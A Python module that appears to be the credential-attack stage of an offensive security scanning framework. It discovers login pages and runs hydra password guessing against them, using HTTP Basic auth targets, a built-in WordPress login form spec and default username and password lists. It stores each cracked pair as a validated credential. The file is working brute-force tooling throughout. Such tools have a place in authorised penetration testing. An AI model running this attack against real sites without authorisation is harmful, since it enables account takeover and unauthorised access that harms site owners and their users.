"""Credential attacks (OFFENSIVE) — online password guessing with hydra.

Discovers login surfaces from the probe/crawl data and tests them with hydra:

  * HTTP Basic/Digest auth — any endpoint that answered 401 (well-defined).
  * Form logins — WordPress ``wp-login.php`` (known form spec) or a user-supplied
    ``auth_form`` spec for other apps.

Every valid pair hydra returns is recorded as a validated Credential. Wordlists
default to a small built-in common set; point ``auth_userlist``/``auth_passlist``
at real lists for a serious run.
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit

from ..models import Credential, StageRun
from ..util import dedupe, write_lines
from .. import runner
from .base import Stage, StageContext

LOGIN_HINT = re.compile(r"(login|log-in|signin|sign-in|admin|wp-login|/auth|session|account)",
                        re.IGNORECASE)
CRED_RE = re.compile(r"login:\s*(?P<u>.*?)\s+password:\s*(?P<p>.*?)\s*$")

DEFAULT_USERS = ["admin", "administrator", "root", "user", "test"]
DEFAULT_PASSWORDS = ["admin", "password", "123456", "root", "test",
                     "admin123", "changeme", "letmein"]
# hydra http-post-form spec for a stock WordPress login.
WP_FORM = ("/wp-login.php:log=^USER^&pwd=^PASS^:F=Error|incorrect|not registered")


class AuthAttackStage(Stage):
    name = "auth_attack"
    tools = ["hydra"]
    tier = "offensive"                  # gated behind --exploit
    depends_on = ["http_probe"]

    def execute(self, ctx: StageContext, record: StageRun) -> str:
        targets = self._targets(ctx)[: ctx.config.auth_max_targets]
        if not targets:
            return "no login surfaces discovered"

        sdir = ctx.stage_dir(self.name)
        userfile = self._list_file(ctx.config.auth_userlist, DEFAULT_USERS, sdir, "users.txt")
        passfile = self._list_file(ctx.config.auth_passlist, DEFAULT_PASSWORDS, sdir, "passwords.txt")

        found = 0
        for i, (url, mode) in enumerate(targets):
            creds = self._attack(ctx, sdir, url, mode, userfile, passfile, i)
            for user, pw in creds:
                found += 1
                ctx.results.credentials.append(Credential(
                    host=urlsplit(url).hostname or url, service="http",
                    username=user, password=pw, source="auth_attack", validated=True))

        record.produced = found
        return f"{found} valid credential(s) across {len(targets)} login surface(s)"

    # -- target discovery -------------------------------------------------
    def _targets(self, ctx: StageContext) -> list[tuple[str, str]]:
        """Return (url, mode) pairs where mode is 'basic' or 'form'."""
        out: list[tuple[str, str]] = []
        seen: set[str] = set()

        def add(url: str, mode: str) -> None:
            if url and url not in seen:
                seen.add(url)
                out.append((url, mode))

        # Basic-auth: endpoints that challenged with 401.
        for e in ctx.results.endpoints:
            if e.status == 401 and e.url:
                add(e.url, "basic")

        # Form logins: WordPress, or any login-ish URL when a form spec is set.
        for e in ctx.results.endpoints:
            if e.url and "wp-login.php" in e.url.lower():
                add(e.url, "form")
        if ctx.config.auth_form:
            for u in ctx.results.crawl_urls:
                if LOGIN_HINT.search(u.url):
                    add(u.url, "form")
        return out

    # -- hydra invocation -------------------------------------------------
    def _attack(self, ctx, sdir, url, mode, userfile, passfile, idx) -> list[tuple[str, str]]:
        parts = urlsplit(url)
        host = parts.hostname
        if not host:
            return []
        https = parts.scheme == "https"
        port = parts.port or (443 if https else 80)
        out_file = sdir / f"hydra_{idx}.txt"

        cmd = ["hydra", "-L", str(userfile), "-P", str(passfile),
               "-s", str(port), "-o", str(out_file), "-I"]
        if ctx.config.auth_stop_on_success:
            cmd.append("-f")
        if https:
            cmd.append("-S")

        if mode == "basic":
            module = "https-get" if https else "http-get"
            cmd += [host, module, parts.path or "/"]
        else:  # form
            spec = WP_FORM if "wp-login.php" in url.lower() else ctx.config.auth_form
            if not spec:
                return []
            module = "https-post-form" if https else "http-post-form"
            cmd += [host, module, spec]

        res = runner.run(cmd, timeout=ctx.config.timeout_for(self.name),
                         log_dir=sdir, log_name=f"hydra_{idx}")
        text = res.stdout
        if out_file.exists():
            text += "\n" + out_file.read_text(errors="replace")
        return self._parse(text)

    @staticmethod
    def _parse(text: str) -> list[tuple[str, str]]:
        pairs: list[tuple[str, str]] = []
        for line in (text or "").splitlines():
            m = CRED_RE.search(line)
            if m:
                pairs.append((m.group("u"), m.group("p")))
        # de-dup while preserving order
        return [p for i, p in enumerate(pairs) if p not in pairs[:i]]

    @staticmethod
    def _list_file(configured: str, defaults: list[str], sdir, fallback_name: str):
        if configured:
            return configured
        path = sdir / fallback_name
        write_lines(path, dedupe(defaults))
        return path
